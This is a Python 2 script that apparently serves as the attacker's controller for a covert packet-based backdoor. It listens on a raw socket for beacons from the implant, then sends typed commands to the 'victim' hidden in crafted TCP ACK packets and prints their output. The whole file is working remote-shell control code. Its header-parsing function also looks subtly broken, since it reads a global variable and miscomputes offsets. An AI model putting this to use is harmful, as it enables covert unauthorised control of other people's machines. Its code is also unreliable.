import sys
import socket
import struct
import random
import share

def get_sender_info(pkt):
    ip_header_len = ord(pkt[14:15]) & 0b00001111
    src_ip = socket.inet_ntoa(pkt[14 + ip_header_len - 8 : 14 + ip_header_len - 4])      
    src_port = struct.unpack("!H", packet[14 + ip_header_len : 14 + ip_header_len + 2])[0] 
    return (src_ip, src_port)

def send_command(cmd): 
    syn = random.randint(2 ** 31, 2 ** 32)
    ack = random.randint(2 ** 31, 2 ** 32)
    pkt = share.craft_ack((bind_host, bind_port, bd_host, bd_port), (syn, ack), cmd) 
    sender.sendto(pkt, (bd_host, bd_port) )     

if len(sys.argv) == 3:
    bind_host = sys.argv[1]
    bind_port = sys.argv[2]
else:
    print "[-] options must be specified in the following format"
    print "[*] python %s listening_ip listening_port" % sys.argv[0]
    exit(0)

sender = socket.socket(socket.AF_INET, socket.SOCK_RAW, 6)
receiver = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
receiver.bind(("wlan0", 0x0800))

print "[*] Listening for connection"
while True:
    try:
        packet, addr = receiver.recvfrom(2048)
        if "protocol:bpv1" in packet:
            print "[+] Received a connection from backdoor"
            bd_host, bd_port = get_sender_info(packet) # get backdoor ip and backdoor port
            send_command("signal:ok" + "\r\n")
            command = "command:" + raw_input("<shell@victim> ") + "\r\n"
            send_command(command)
        elif "output:" in packet: 
            bd_host, bd_port = get_sender_info(packet) # get backdoor ip and backdoor port
            output = packet.split("output:")[1].strip("\r\n")     
            print output
            command = "command:" + raw_input("<shell@victim> ") + "\r\n"
            send_command(command)
            if command.strip("\r\n") == "command:exit":
                break
    except KeyboardInterrupt:
        break

           
